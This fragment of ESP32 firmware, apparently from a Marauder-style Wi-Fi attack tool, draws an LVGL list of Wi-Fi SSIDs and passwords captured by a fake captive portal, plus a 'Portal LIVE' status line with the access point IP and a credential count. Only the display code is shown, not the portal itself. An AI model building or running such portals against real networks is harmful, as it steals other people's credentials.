        for (int i = 0; i < portalCredCount; i++) {
            char buf[120];
            snprintf(buf, sizeof(buf), "%.32s\n  %.32s",
                     portalCreds[i].ssid, portalCreds[i].pass);
            lv_obj_t *btn = lv_list_add_btn(mar.portal_list, NULL, buf);
            lv_obj_set_style_bg_color(btn, lv_color_hex(MAR_PANEL), 0);
            lv_obj_set_style_text_color(btn, lv_color_hex(0xCCCCCC), 0);
            lv_obj_set_style_text_font(btn, &lv_font_montserrat_14, 0);
            lv_obj_set_style_pad_all(btn, 3, 0);
        }
    }
    if (portalRunning) {
        IPAddress ap = WiFi.softAPIP();
        char buf[120];
        snprintf(buf, sizeof(buf), "Portal LIVE  AP:%s  creds:%d",
                 ap.toString().c_str(), portalCredCount);
        lv_label_set_text(mar.portal_lbl, buf);
    }
}

#endif
